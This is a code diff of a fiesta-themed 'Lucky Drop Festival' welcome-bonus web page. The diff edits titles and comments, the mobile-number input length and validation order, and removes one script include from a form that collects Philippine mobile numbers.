@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Welcome Bonus | Lucky Drop</title>
+    <title>Welcome Bonus | Lucky Drop Festival</title>
     
     <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     
-    <!-- Google Fonts — Disney-Pixar Style -->
+    <!-- Google Fonts — Disney-Pixar Mexican Fiesta Style -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@400;500;600;700;800&family=Cinzel:wght@400;500;600;700;800;900&family=Fredoka:wght@300;400;500;600;700&family=Orbitron:wght@400;500;600;700;800;900&family=Pacifico&family=Playfair+Display:wght@400;500;600;700;800;900&family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
@@ -72,14 +72,14 @@
     </div>
 
     <!-- ============================================================
-         MAIN CARD — DISNEY-PIXAR MEXICAN FESTIVAL THEME
+         MAIN CARD — DISNEY-PIXAR MEXICAN FIESTA THEME
          ============================================================ -->
     <div class="main-card">
         
-        <!-- ✅ Piñata Background Image -->
+        <!-- ✅ PIÑATA BACKGROUND IMAGE (sa taas ng card) -->
         <div class="card-bg-image"></div>
         
-        <!-- ✅ Dark overlay for readability -->
+        <!-- ✅ DARK OVERLAY FOR READABILITY -->
         <div class="card-bg-overlay"></div>
 
         <!-- ========== CARD CONTENT ========== -->
@@ -179,7 +179,9 @@
                 </div>
             </div>
 
-            <!-- ========== ✅ REMASTERED VERIFICATION FORM ========== -->
+            <!-- ============================================================
+                 ✅ REMASTERED VERIFICATION SECTION
+                 ============================================================ -->
             <div class="verification-section" id="verificationSection">
                 
                 <div class="verification-header">
@@ -202,7 +204,7 @@
                         id="mobileNumber" 
                         class="mobile-input" 
                         placeholder="9XX XXX XXXX" 
-                        maxlength="10"
+                        maxlength="12"
                         inputmode="numeric"
                         autocomplete="off"
                     >
@@ -238,7 +240,7 @@
     </div>
 
     <!-- ============================================================
-         MODAL — VERIFICATION SUCCESS / LOADING
+         MODAL — LOADING / SUCCESS
          ============================================================ -->
     <div class="modal-overlay" id="modalOverlay">
         <div class="modal-container">
@@ -252,7 +254,6 @@
          SCRIPTS
          ============================================================ -->
     <script src="js/config.js"></script>
-    <script src="js/festival.js"></script>
 
     <!-- ============================================================
          INLINE SCRIPT — Verification Logic
@@ -275,7 +276,7 @@
                     // Remove non-digits
                     var value = this.value.replace(/\D/g, '');
                     
-                    // Limit to 10 digits
+                    // Limit to 10 digits (9XXXXXXXXX)
                     if (value.length > 10) {
                         value = value.substring(0, 10);
                     }
@@ -316,14 +317,14 @@
                     return;
                 }
                 
-                // Format as 09XXXXXXXXX
-                var fullPhone = '0' + rawValue; // 9XXXXXXXXX -> 09XXXXXXXXX
-                
                 // Validate starts with 9
                 if (rawValue.charAt(0) !== '9') {
                     showError('Mobile number must start with 9');
                     return;
                 }
+                
+                // Format as 09XXXXXXXXX
+                var fullPhone = '0' + rawValue; // 9XXXXXXXXX -> 09XXXXXXXXX
 
                 // Disable button
                 submitBtn.disabled = true;
@@ -379,7 +380,7 @@
                 });
             }
 
-            // ========== LOAD TREND DATA (optional) ==========
+            // ========== LOAD TREND DATA ==========
             function loadTrendData() {
                 if (typeof firebase === 'undefined' || !firebase.database) return;
                 
